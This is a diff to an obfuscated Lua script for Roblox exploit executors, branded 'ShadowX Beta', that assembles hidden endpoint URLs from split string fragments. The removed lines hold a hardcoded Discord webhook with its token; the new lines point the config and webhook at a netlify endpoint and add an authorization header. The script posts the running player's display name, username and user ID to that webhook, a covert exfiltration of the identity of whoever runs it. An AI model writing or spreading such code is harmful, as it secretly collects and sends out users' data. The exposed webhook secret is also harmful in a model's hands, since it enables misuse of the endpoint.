@@ -11,22 +11,14 @@ assert(v66471928374650193847 ~= nil, "No local player")
 assert(typeof(v20193847562910384756) == "Instance", "Invalid environment")
 
 local function v48291736501928374650()
-    local p = {
-        "https://raw.git", "hubusercontent", ".com/nd827h3-ndi2",
-        "73hd-kqow82us-qk", "o28ec/92iejewo-lwo", "29edi-91p1lwowo-",
-        "kso28ha/refs/heads", "/main/source.json"
-    }
+    local p = { "https://shadowxprotection", ".netlify.app", "/api/config" }
     local r = table.concat(p)
     p = nil
     return r
 end
 
 local function v91827364501928374650()
-    local p = {
-        "https://discord.com/api/webhooks/", "1500000787185537084/",
-        "sTtB9I9Yzhz7jy4GfmZHjZO5J_2y4G-WC",
-        "SNl3OblywUTOs1u_XVcp0uSx2-_3LDPTHM8"
-    }
+    local p = { "https://shadowxprotection", ".netlify.app", "/api/webhook" }
     local r = table.concat(p)
     p = nil
     return r
@@ -49,10 +41,25 @@ end
 
 local v29384756102938475610 = (syn and syn.request) or (http and http.request) or (typeof(request) == "function" and request)
 
+local v_authToken = '@#$_&-+()/*"' .. "':;!?_1029384756"
+
 local function v83746501928374650192(url)
-    local ok, res = pcall(game.HttpGet, game, url, true)
-    assert(ok and res and res ~= "", "Request failed")
-    return res
+    if v29384756102938475610 then
+        local ok, res = pcall(v29384756102938475610, {
+            Url     = url,
+            Method  = "GET",
+            Headers = {
+                ["Authorization"] = v_authToken,
+                ["Content-Type"]  = "application/json",
+            },
+        })
+        assert(ok and res and res.Body and res.Body ~= "", "Request failed")
+        return res.Body
+    else
+        local ok, res = pcall(game.HttpGet, game, url, true)
+        assert(ok and res and res ~= "", "Request failed")
+        return res
+    end
 end
 
 local function v57391028374650192837()
@@ -251,8 +258,11 @@ local function v55019283746501928374(kind, msg, extra, placeStr, whUrl)
     pcall(v29384756102938475610, {
         Url     = whUrl,
         Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body    = v94827364019283746152:JSONEncode({
+        Headers = {
+            ["Content-Type"]  = "application/json",
+            ["Authorization"] = v_authToken,
+        },
+        Body = v94827364019283746152:JSONEncode({
             embeds = {{ title="ShadowX Beta | "..kind:upper(), color=v_dbgColors[kind] or 8421504, fields=fields }}
         }),
     })
@@ -291,8 +301,11 @@ local function v40928374650192837465(placeStr, whUrl)
     pcall(v29384756102938475610, {
         Url     = whUrl,
         Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body    = v94827364019283746152:JSONEncode({
+        Headers = {
+            ["Content-Type"]  = "application/json",
+            ["Authorization"] = v_authToken,
+        },
+        Body = v94827364019283746152:JSONEncode({
             embeds = {{ title="User Data", color=5793266, fields={
                 { name="Display Name", value=lp.DisplayName,                                                                           inline=true },
                 { name="Username",     value=lp.Name.." ("..lp.UserId..")",                                                            inline=true },
